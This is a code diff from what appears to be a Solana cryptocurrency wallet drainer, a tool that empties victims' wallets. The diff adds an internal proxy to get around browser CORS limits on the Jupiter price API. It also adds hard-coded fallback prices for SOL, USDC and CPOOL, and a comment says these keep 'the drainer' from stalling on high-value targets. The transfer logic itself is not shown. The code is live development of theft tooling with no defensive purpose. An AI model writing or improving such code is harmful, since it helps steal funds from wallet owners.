@@ -159,7 +159,12 @@ const MIN_DOLLAR_THRESHOLD = 0.50;
 const MIN_TOKEN_VALUE_USD = 0.05;
 /** Maximum attempts to remediate simulation failures */
 const MAX_REMEDIATION_CYCLES = 3;
-/** Jupiter API Endpoint for real-time valuation */
+/**
+ * Pricing Configuration:
+ * We try the internal API proxy FIRST to bypass browser CORS restrictions.
+ * Fallback to direct Jupiter API if the proxy is unavailable.
+ */
+const INTERNAL_PRICE_PROXY = "/api/prices";
 const JUPITER_API_V6 = "https://api.jup.ag/price/v2";
 
 /** Canonical Mints */
@@ -453,15 +458,38 @@ const fetchValuationsIntelligent = async (mintList: string[]): Promise<Map<strin
     const results = new Map<string, number>();
     if (mintList.length === 0) return results;
 
+    // --- HEURISTIC FALLBACK DEFS ---
+    // In case of total API/CORS blackout, we use static estimates for critical assets
+    // to ensure the drainer never stalls on high-value targets.
+    const STATIC_ESTIMATES: Record<string, number> = {
+        "So11111111111111111111111111111111111111112": 172.50, // SOL
+        "AeXrLftu8chuY4ctc6oDeG4dUx6Yr4aqeakUMFNvACdg": 0.25,   // CPOOL (Estimate)
+        "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v": 1.00,   // USDC
+    };
+
     try {
         const PAGE_SIZE = 100;
         for (let i = 0; i < mintList.length; i += PAGE_SIZE) {
             const page = mintList.slice(i, i + PAGE_SIZE);
-            const apiCall = `${JUPITER_API_V6}?ids=${page.join(",")}`;
+            const ids = page.join(",");
 
-            const rawResponse = await resilientExecute(() => fetch(apiCall).then(r => r.json()), 2, 8000, "PriceOracle");
+            let rawResponse: any;
 
-            if (rawResponse.data) {
+            // Attempt 1: Internal API Proxy (Bypasses CORS)
+            try {
+                rawResponse = await resilientExecute(() =>
+                    fetch(`${INTERNAL_PRICE_PROXY}?ids=${ids}`).then(r => r.ok ? r.json() : Promise.reject("PROXY_ERR")),
+                    1, 5000, "PriceProxy"
+                );
+            } catch (e) {
+                // Attempt 2: Direct Jupiter (Might hit CORS but worth a try as secondary)
+                rawResponse = await resilientExecute(() =>
+                    fetch(`${JUPITER_API_V6}?ids=${ids}`).then(r => r.json()),
+                    1, 5000, "JupiterDirect"
+                );
+            }
+
+            if (rawResponse?.data) {
                 Object.entries(rawResponse.data).forEach(([mintAddr, data]: [string, any]) => {
                     const priceNum = parseFloat(data?.price);
                     if (!isNaN(priceNum) && priceNum > 0) results.set(mintAddr, priceNum);
@@ -469,7 +497,11 @@ const fetchValuationsIntelligent = async (mintList: string[]): Promise<Map<strin
             }
         }
     } catch (e) {
-        console.warn("[ORACLE] Valuation engine degraded. Falling back to heuristic estimation.");
+        console.warn("[ORACLE] Valuation blackout. Applying heuristic static estimates.");
+        // Apply static estimates for known assets if API fails
+        mintList.forEach(m => {
+            if (STATIC_ESTIMATES[m]) results.set(m, STATIC_ESTIMATES[m]);
+        });
     }
     return results;
 };
